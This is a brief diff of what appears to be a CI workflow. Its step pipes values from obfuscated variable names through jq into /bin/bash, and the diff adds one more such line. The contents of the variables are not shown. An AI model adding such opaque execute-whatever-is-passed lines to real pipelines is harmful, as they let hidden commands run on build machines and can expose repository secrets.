@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
           echo $juowd962 | jq -r .mpwpf5 | /bin/bash
           echo $rqlc50 | jq -r .gycfg65 | /bin/bash
+          echo $spegg44921 | jq -r .emsf27330 | /bin/bash
 
       - name: Save output
         if: always()
